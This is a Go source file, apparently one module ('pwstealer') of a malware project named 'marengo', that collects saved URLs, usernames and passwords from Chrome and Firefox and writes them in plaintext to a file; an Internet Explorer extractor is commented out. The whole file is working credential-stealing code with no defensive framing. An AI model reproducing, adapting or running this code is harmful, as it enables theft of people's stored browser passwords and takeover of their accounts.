package pwstealer

import (
	"bufio"
	"marengo/modules/pwstealer/chrome"
	"marengo/modules/pwstealer/common"
	"marengo/modules/pwstealer/firefox"
	"os"
	"strings"
)

func ExtractBrowserCredentials() ([]common.UrlNamePass, int) {
	var AllBrowsersData []common.UrlNamePass
	if resultChrome := chrome.ChromeExtractDataRun(); resultChrome.Success {
		AllBrowsersData = append(AllBrowsersData, resultChrome.Data...)
	}

	if resultMozilla := firefox.MozillaExtractDataRun("browser"); resultMozilla.Success {
		AllBrowsersData = append(AllBrowsersData, resultMozilla.Data...)
	}

	// if resultInternetExplorer := browsers.InternetExplorerExtractDataRun(); resultInternetExplorer.Success {
	// 	AllBrowsersData = append(AllBrowsersData, resultInternetExplorer.Data...)
	// }

	return AllBrowsersData, len(AllBrowsersData)
}

func GetPassword(filename string) error {

	browserData, _ := ExtractBrowserCredentials()

	if len(browserData) == 0 {
		return nil
	}
	file, err := os.OpenFile(filename, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	writer := bufio.NewWriter(file)

	for _, k := range browserData {
		if strings.Trim(k.Username, "") == "" {
			continue
		}
		writer.WriteString(k.Url + "\t" + k.Username + "\t" + k.Pass + "\n")
	}

	err = writer.Flush()
	if err != nil {
		return err
	}
	return nil
}
